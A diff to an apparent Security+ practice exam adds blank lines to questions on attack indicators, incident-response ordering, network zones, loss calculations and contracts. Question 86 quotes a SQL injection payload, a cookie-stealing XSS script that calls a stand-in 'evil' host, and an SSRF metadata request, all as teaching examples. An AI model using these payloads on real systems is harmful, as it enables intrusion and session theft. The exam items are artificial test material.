@@ -527,6 +527,7 @@ D. Anonymization uses bcrypt
 These are multi-part performance-based questions. Read carefully — each part adds to the score.
 
 ### 86 (PBQ — Match attacks to indicators). Match each web log indicator to its attack name:
+
 - (i) `id=42' UNION SELECT username,password FROM users--`
 - (ii) `<script>document.location='http://evil/'+document.cookie</script>` saved in a forum post
 - (iii) Request from internal IP to `http://169.254.169.254/latest/meta-data/`
@@ -539,6 +540,7 @@ C. (i) CSRF, (ii) SQLi, (iii) DDoS, (iv) Pharming, (v) Phishing
 D. (i) SSRF, (ii) Reflected XSS, (iii) SQLi, (iv) Open redirect, (v) CSRF
 
 ### 87 (PBQ — IR ordering). A SOC sees a host beaconing to a known C2 and laterally moving via SMB. Order these actions per the NIST IR lifecycle (earliest to latest):
+
 - (A) Update playbooks with new IOCs
 - (B) Capture memory image of the host
 - (C) Determine scope of impact (which other hosts touched)
@@ -553,6 +555,7 @@ C. A → C → B → D → E → F → G
 D. D → C → B → A → E → F → G
 
 ### 88 (PBQ — Place network appliances). You're designing the network. Match each item to its zone (Internet / DMZ / Internal / Secure Zone / Management):
+
 - (i) Public web servers
 - (ii) DB servers reachable only from the web tier on specific ports
 - (iii) Corporate file servers + employee laptops
@@ -566,6 +569,7 @@ C. (i) Secure, (ii) DMZ, (iii) Management, (iv) Internet, (v) DMZ, (vi) Internal
 D. All in DMZ
 
 ### 89 (PBQ — Risk treatment + math). The Acme Corp risk register includes:
+
 - Asset: HR database. AV = $2,000,000. EF per ransomware event = 25%. ARO = 0.20/year.
 - Asset: Public marketing website. AV = $100,000. EF per DDoS = 50%. ARO = 1.0/year.
 
@@ -577,6 +581,7 @@ C. HR ALE = $500,000; Website ALE = $100,000. Both: transfer.
 D. HR ALE = $50,000; Website ALE = $25,000. Both: accept.
 
 ### 90 (PBQ — Match contract to scenario). For each scenario, pick the most appropriate document(s):
+
 - (i) Company hires a SaaS vendor for a 6-month POC under an ongoing master agreement
 - (ii) Vendor will process EU customer personal data
 - (iii) Two healthcare providers exchange Protected Health Information for treatment continuity
@@ -822,6 +827,7 @@ D. All five = MSAs
 ## 🔍 Final Review Process
 
 For EVERY missed question:
+
 1. Note the **domain** (Domain 1-5) and **module** it came from
 2. Tally missed by domain — is one domain dominating? That's your weak spot
 3. Re-read the relevant Reading.md sections
